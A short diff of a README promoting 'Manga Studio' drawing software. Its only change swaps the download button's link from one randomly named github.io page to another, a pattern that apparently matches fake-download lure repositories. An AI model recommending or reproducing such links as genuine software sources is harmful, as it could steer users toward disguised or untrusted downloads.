@@ -21,7 +21,7 @@ To begin using this **Manga Studio Drawing Software** and **Manga Studio Digital
 | :--- | :--- |
 | **Get Manga Studio Drawing Software** | Click the button below to start using this **Manga Studio Panel Maker**. |
 
-[![Button](https://img.shields.io/badge/🎨-Get_Manga_Studio-2ea44f?style=for-the-badge)](https://riverfelixsfkb.github.io/.github/manga-studio-drawing-software)
+[![Button](https://img.shields.io/badge/🎨-Get_Manga_Studio-2ea44f?style=for-the-badge)](https://tannercohenvdwz.github.io/.github/manga-studio-drawing-software)
 
 ## System Requirements
 
